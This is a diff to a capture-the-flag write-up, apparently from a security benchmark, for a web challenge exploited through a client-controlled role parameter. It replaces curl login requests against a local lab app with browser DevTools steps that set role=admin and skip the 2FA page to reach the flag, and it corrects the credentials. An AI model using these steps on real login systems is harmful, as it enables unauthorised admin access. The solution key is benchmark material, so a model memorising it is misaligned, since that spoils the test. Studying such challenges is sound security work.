@@ -3,15 +3,18 @@ title: "XBEN-089-24"
 category: "Web"
 taxonomy: "Business Logic / Broken Authorization"
 vulnerability: "Privilege Escalation via Client-Controlled Role Parameter"
-difficulty: "Easy"
+difficulty: "Medium"
 ---
+
+> **Documentation update — 2026-10-19 (after the pilot):** This is a source-code-checked, browser-first technical explanation. It is **not** a reconstructed transcript of any participant's actions and does not establish which files were present in the RAG index during P04–P06. Earlier revisions remain available in Git history.
+
 
 
 # **Challenge: XBEN-089-24**
 
 ## **1. Overview** {#overview}
 
-- **Difficulty:** Easy
+- **Difficulty:** Medium
 
 - **Type:** Web
 
@@ -154,33 +157,19 @@ if session\[\'role\'\] == \'admin\'
 
   - Deeper analysis of how session state is used across endpoints
 
-## **6. Exploitation** {#exploitation}
+## **6. Exploitation — browser-first reproduction** {#exploitation}
 
-### **Steps:**
+**Source-verified test path (not a participant transcript):**
 
-1.  Identify valid credentials from the database:  
-    >   
-    > emp / password1
+1. Go to `/employee/login` using a browser and inspect the hidden input `role=employee`.
+2. In browser DevTools, edit the live hidden input to `role=admin`.
+3. Enter the benchmark credentials `emp / emppassword` and submit. The login JavaScript sends `POST /login` with that client-controlled role.
+4. After redirect to `/admin/2fa`, manually navigate in the **same browser session** to `/admin/dashboard` without entering any OTP.
+5. The administrative page checks the session role but not an OTP-verification state and displays the flag.
 
-2.  Send a crafted login request:
+**HTTP concept:** the browser's login request contains `username=emp`, `password=emppassword` and `role=admin`. A terminal request is not necessary; the browser manages session cookies itself.
 
-curl -i -c cookies.txt -X POST http://127.0.0.1:5003/login \\
-
--d \"username=emp&password=password1&role=admin\"
-
-3.  Access admin dashboard using session cookie:
-
-curl -b cookies.txt http://127.0.0.1:5003/admin/dashboard
-
-4.  Extract the flag from the HTML response:
-
-curl -s -b cookies.txt http://127.0.0.1:5003/admin/dashboard \| grep flag
-
-### **Requests / payloads:** {#requests-payloads}
-
-POST /login
-
-username=emp&password=password1&role=admin
+**Evidence:** `../../challenges/challenges/XBEN-089-24/app/app.py`, `app/templates/login.html` and the original README. The older `password1` value in the documentation was incorrect; source and README specify `emppassword`.
 
 ## **7. Final Solution** {#final-solution}
 
